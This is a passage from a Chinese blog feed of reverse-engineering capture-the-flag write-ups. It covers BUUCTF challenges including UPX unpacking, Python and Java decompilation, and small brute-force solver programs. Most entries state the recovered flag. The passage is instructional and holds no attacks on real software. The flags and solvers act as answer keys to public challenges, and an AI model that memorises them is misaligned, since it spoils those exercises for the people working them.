<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE hModule = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;crack_rtf.exe&quot;</span>);</span><br><span class="line">	<span class="comment">//将程序载入获取模块句柄</span></span><br><span class="line">	<span class="keyword">if</span> (!hModule)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	HRSRC hResInfo = <span class="built_in">FindResourceA</span>(hModule, (LPCSTR)<span class="number">0x65</span>, <span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hResInfo)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	HGLOBAL hResData = <span class="built_in">LoadResource</span>(hModule, hResInfo);</span><br><span class="line">	<span class="keyword">if</span> (!hResData)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	BYTE* lpRes = (BYTE*)<span class="built_in">LockResource</span>(hResData);</span><br><span class="line">	<span class="keyword">if</span> (!lpRes)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	BYTE lpHeaderByte[<span class="number">6</span>] = &#123; <span class="number">0x7B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x31</span> &#125;;</span><br><span class="line">	<span class="comment">//RTF文件头前6字节</span></span><br><span class="line">	<span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">		<span class="keyword">for</span> (BYTE c = <span class="number">32</span>; c &lt; <span class="number">127</span>; c++)	<span class="comment">//穷举所有ASCII可打印字符</span></span><br><span class="line">			<span class="keyword">if</span> ((lpRes[i] ^ c) == lpHeaderByte[i])	<span class="comment">//验证字符</span></span><br><span class="line">				<span class="built_in">putchar</span>(c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//~!3a@0</span></span><br></pre></td></tr></table></figure>
<p>最终, <strong>flag</strong>为<code>flag&#123;N0_M0re_Free_Bugs&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[ACTF新生赛2020]easyre</title>
    <url>/2022/01/23/%5BReverse%5DACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-easyre/</url>
    <content><![CDATA[<p>有<code>UPX</code>壳, 先脱壳<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201232317210.png"
alt="image-20220123231753142" /></p>
<p>这次采用<code>堆栈平衡法(esp定律法)</code>来寻找<code>popad</code>,
从而找到程序的真正的入口. 也可以采用直接找<code>popad</code>的方法,
<code>UPX</code>一般可以这么干, 见 <a
href="/2022/01/20/%5BReverse%5D新年快乐/">[BUUCTF]新年快乐</a></p>
<p>程序的入口点是一个<code>pushad</code>, F8让它执行,
改变<code>esp</code>, 对<code>esp</code>下硬件断点</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201232325493.png"
alt="image-20220123232551388" />
<figcaption aria-hidden="true">image-20220123232551388</figcaption>
</figure>
<p>然后让程序跑起来, 被硬件断点断下,
可以看到刚好断在<code>popad</code>之后.</p>
<p>一般对于<code>UPX</code>来说<code>popad</code>之后的第一个<code>jmp</code>就是跳到程序真正的入口点,
这里是<code>0x401280</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201232327307.png"
alt="image-20220123232745208" />
<figcaption aria-hidden="true">image-20220123232745208</figcaption>
</figure>
<p>然后用<code>Scylla</code>插件脱壳, 用法见 <a
href="/2022/01/20/%5BReverse%5D新年快乐/">[BUUCTF]新年快乐</a></p>
<p>脱壳完了拖进<code>IDA</code>, F5查看伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">12</span>]; <span class="comment">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class="line">  _DWORD v5[<span class="number">3</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  _BYTE v6[<span class="number">5</span>]; <span class="comment">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+2Fh] [ebp-11h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+33h] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+37h] [ebp-9h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+3Bh] [ebp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401A10();</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);		<span class="comment">//利用scanf()的溢出去修改v7~v10</span></span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="string">&#x27;A&#x27;</span> || v6[<span class="number">1</span>] != <span class="string">&#x27;C&#x27;</span> || v6[<span class="number">2</span>] != <span class="string">&#x27;T&#x27;</span> || v6[<span class="number">3</span>] != <span class="string">&#x27;F&#x27;</span> || v6[<span class="number">4</span>] != <span class="string">&#x27;&#123;&#x27;</span> || v10 != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">    <span class="comment">//判断输入格式符不符合ACTF&#123;...&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = v7;</span><br><span class="line">  v5[<span class="number">1</span>] = v8;</span><br><span class="line">  v5[<span class="number">2</span>] = v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != byte_402000[*((<span class="type">char</span> *)v5 + i) - <span class="number">1</span>] )</span><br><span class="line">      <span class="comment">//逐个字节对比, 可以通过在码表中逐位穷举来逆推出v5的每一个字节</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>取得v5的代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> v4[] = <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>;</span><br><span class="line">    <span class="type">char</span> v5[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> byte_402000[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">126</span>, <span class="number">125</span>, <span class="number">124</span>, <span class="number">123</span>, <span class="number">122</span>, <span class="number">121</span>, <span class="number">120</span>, <span class="number">119</span>, <span class="number">118</span>, <span class="number">117</span>,</span><br><span class="line">      <span class="number">116</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">113</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">107</span>,</span><br><span class="line">      <span class="number">106</span>, <span class="number">105</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">100</span>,  <span class="number">99</span>,  <span class="number">98</span>,  <span class="number">97</span>,</span><br><span class="line">       <span class="number">96</span>,  <span class="number">95</span>,  <span class="number">94</span>,  <span class="number">93</span>,  <span class="number">92</span>,  <span class="number">91</span>,  <span class="number">90</span>,  <span class="number">89</span>,  <span class="number">88</span>,  <span class="number">87</span>,</span><br><span class="line">       <span class="number">86</span>,  <span class="number">85</span>,  <span class="number">84</span>,  <span class="number">83</span>,  <span class="number">82</span>,  <span class="number">81</span>,  <span class="number">80</span>,  <span class="number">79</span>,  <span class="number">78</span>,  <span class="number">77</span>,</span><br><span class="line">       <span class="number">76</span>,  <span class="number">75</span>,  <span class="number">74</span>,  <span class="number">73</span>,  <span class="number">72</span>,  <span class="number">71</span>,  <span class="number">70</span>,  <span class="number">69</span>,  <span class="number">68</span>,  <span class="number">67</span>,</span><br><span class="line">       <span class="number">66</span>,  <span class="number">65</span>,  <span class="number">64</span>,  <span class="number">63</span>,  <span class="number">62</span>,  <span class="number">61</span>,  <span class="number">60</span>,  <span class="number">59</span>,  <span class="number">58</span>,  <span class="number">57</span>,</span><br><span class="line">       <span class="number">56</span>,  <span class="number">55</span>,  <span class="number">54</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">51</span>,  <span class="number">50</span>,  <span class="number">49</span>,  <span class="number">48</span>,  <span class="number">47</span>,</span><br><span class="line">       <span class="number">46</span>,  <span class="number">45</span>,  <span class="number">44</span>,  <span class="number">43</span>,  <span class="number">42</span>,  <span class="number">41</span>,  <span class="number">40</span>,  <span class="number">39</span>,  <span class="number">38</span>,  <span class="number">37</span>,</span><br><span class="line">       <span class="number">36</span>,  <span class="number">35</span>,  <span class="number">32</span>,  <span class="number">33</span>,  <span class="number">34</span>,   <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">sizeof</span>(byte_402000); j++)</span><br><span class="line">            <span class="comment">//设v5[i]-1=j, 穷举出j的值</span></span><br><span class="line">            <span class="keyword">if</span> (v4[i] == byte_402000[j])</span><br><span class="line">                v5[i] = j + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//U9X_1S_W6@T?</span></span><br></pre></td></tr></table></figure>
<p>我们就得出<code>ACTF&#123;U9X_1S_W6@T?&#125;</code>, 验证一下</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201240044767.png"
alt="image-20220124004429711" />
<figcaption aria-hidden="true">image-20220124004429711</figcaption>
</figure>
<p>没问题,
所以<strong>flag</strong>就是<code>flag&#123;U9X_1S_W6@T?&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
  </entry>
  <entry>
    <title>[GWCTF 2019]pyre</title>
    <url>/2022/01/23/%5BReverse%5DGWCTF-2019-pyre/</url>
    <content><![CDATA[<p><code>Python</code>的逆向,
采用<code>uncompyle6</code>进行"反编译"</p>
<blockquote>
<p>uncompyle6: <a
href="https://github.com/rocky/python-uncompyle6">Github</a></p>
</blockquote>
<p>安装很简单,
直接用<code>pip</code>安装就可以了(<code>pip</code>建议先换源)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install uncompyle6</span><br></pre></td></tr></table></figure>
<p>使用也简单,
比如要反编译<code>test.pyc</code>输出到<code>decompile.py</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uncompyle6 -o decompile.py test.pyc</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231803989.png"
alt="image-20220123180336910" />
<figcaption aria-hidden="true">image-20220123180336910</figcaption>
</figure>
<p>反编译出来的<code>Python</code>代码有些问题,
还是<code>Python2</code>的, 不过出题人的意图很明显,
最下面的<code>code</code>应该是<code>input1</code>经过两次变换后的结果,
要用它逆推出<code>input1</code>.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231818958.png"
alt="image-20220123181846852" />
<figcaption aria-hidden="true">image-20220123181846852</figcaption>
</figure>
<p>可以对每一位穷举, 照着这个代码里的变换规则来就行, 解密代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> arr[] = &#123; <span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">char</span> result[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="built_in">sizeof</span>(arr) - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)	<span class="comment">//先进行一次异或,初步还原内容</span></span><br><span class="line">		arr[i] = arr[i] ^ arr[i + <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(arr); i++)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)		<span class="comment">//穷举所有可打印ASCII字符</span></span><br><span class="line">			<span class="keyword">if</span> (((j + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span> == arr[i])</span><br><span class="line">				result[i] = j;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//GWHT&#123;Just_Re_1s_Ha66y!&#125;</span></span><br></pre></td></tr></table></figure>
<p>所以<strong>flag</strong>就是<code>flag&#123;Just_Re_1s_Ha66y!&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>Python逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[GXYCTF2019]luck_guy</title>
    <url>/2022/01/22/%5BReverse%5DGXYCTF2019-luck-guy/</url>
    <content><![CDATA[<p>不是PE文件, 进<code>IDA</code>分析, F5看伪代码.</p>
<p><code>main()</code>里面有个<code>patch_me()</code>,
在<code>patch_me()</code>里面找到<code>get_flag()</code>关键函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 s; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);                    <span class="comment">//时间作为随机数种子</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )     <span class="comment">//随机数决定执行哪个case</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);    <span class="comment">//f1=&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">0x7F666F6067756369</span>LL;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键就在<code>1,4,5</code>这三个<code>case</code>里,
应该要以合适的顺序执行才能得到<strong>flag</strong></p>
<p>分析出来正确的顺序应该是<code>4,5,1</code>, 写成Python代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string0 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line">string1 = <span class="string">&quot;\x69\x63\x75\x67\x60\x6f\x66\x7f&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(string1)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        string0 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(string1[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        string0 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(string1[i]) - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(string0)</span><br><span class="line"><span class="comment">#GXY&#123;do_not_hate_me&#125;</span></span><br></pre></td></tr></table></figure>
<p>所以<strong>flag</strong>就是<code>GXY&#123;do_not_hate_me&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]Java逆向解密</title>
    <url>/2022/01/22/%5BReverse%5DJava%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<p>给的是一个<code>Java</code>字节码文件,
<code>Java</code>字节码的反编译还是比较容易的, 可以直接拿到源码,
采用<code>jad</code>反编译</p>
<blockquote>
<p>jad反编译工具: <a href="https://varaneckas.com/jad/">官网</a></p>
</blockquote>
<p>Java源码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://www.kpdus.com/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) </span></span><br><span class="line"><span class="comment">// Source File Name:   Reverse.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reverse</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Reverse</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input the flag \uFF1A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.next();    <span class="comment">//应该是个阻塞方法, 等待用户的输入</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Your input is \uFF1A&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        <span class="type">char</span> stringArr[] = str.toCharArray();</span><br><span class="line">        Encrypt(stringArr);       <span class="comment">//对字符数组进行加密</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">char</span> arr[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">Resultlist</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> arr[i] + <span class="number">64</span> ^ <span class="number">0x20</span>;  <span class="comment">//注意运算优先级, +的优先级更高</span></span><br><span class="line">            Resultlist.add(Integer.valueOf(result));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> KEY[] = &#123;</span><br><span class="line">            <span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, </span><br><span class="line">            <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">KEYList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; KEY.length; j++)</span><br><span class="line">            KEYList.add(Integer.valueOf(KEY[j]));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(Resultlist.equals(KEYList))  <span class="comment">//逐个元素判断Resultlist和KEYList是否相同</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulations\uFF01&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            System.err.println(<span class="string">&quot;Error\uFF01&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没学过<code>Java</code>, 网上查了查不懂的地方,
这个程序的进行的操作如下:</p>
<p>把输入的字符串转成一个<code>char</code>数组,
<code>char</code>数组的每个元素加上<code>64</code>再与<code>0x20</code>异或,
再转成<code>Integer</code>类型放进列表<code>Resultlist</code>,
把<code>KEY</code>数组的每个元素也逐个转成<code>Integer</code>类型添加到另一个列表<code>KEYList</code>,
逐个元素比较判断<code>Resultlist</code>和<code>KEYList</code>是否相等</p>
<p>这里再次用到了关于异或的知识点, 见<a
href="/2022/01/21/%5BReverse%5Dxor/">[BUUCTF]xor</a></p>
<p>解密代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> str[] = &#123;</span><br><span class="line">		<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>,</span><br><span class="line">		<span class="number">136</span>,<span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(str); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		str[i] ^= <span class="number">0x20</span>;</span><br><span class="line">		str[i] -= <span class="number">64</span>;</span><br><span class="line">		<span class="built_in">putchar</span>(str[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//This_is_the_flag_!</span></span><br></pre></td></tr></table></figure>
<p>所以<strong>flag</strong>就是<code>flag&#123;This_is_the_flag_!&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Java逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]findit</title>
    <url>/2022/01/23/%5BReverse%5Dfindit/</url>
    <content><![CDATA[<p>是个<code>apk</code>, 拿<code>AndroidKiller</code>反编译,
找到一个<code>Unicode</code>字符串</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231431068.png"
alt="image-20220123143139971" />
<figcaption aria-hidden="true">image-20220123143139971</figcaption>
</figure>
<p>解码一看, 哈哈高兴的太早了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;\u7b54\u6848\u9519\u4e86\u80bf\u4e48\u529e\u3002\u3002\u3002\</span></span><br><span class="line"><span class="string">            \u4e0d\u7ed9\u4f60\u53c8\u4e0d\u597d\u610f\u601d\u3002\u3002\</span></span><br><span class="line"><span class="string">            \u3002\u54ce\u5440\u597d\u7ea0\u7ed3\u554a~~~&quot;</span></span><br><span class="line"><span class="built_in">print</span>(string)</span><br><span class="line"><span class="comment">#答案错了肿么办。。。            不给你又不好意思。。            。哎呀好纠结啊~~~</span></span><br></pre></td></tr></table></figure>
<p>在<code>MainActivity.smali</code>里面找到了几个数组,
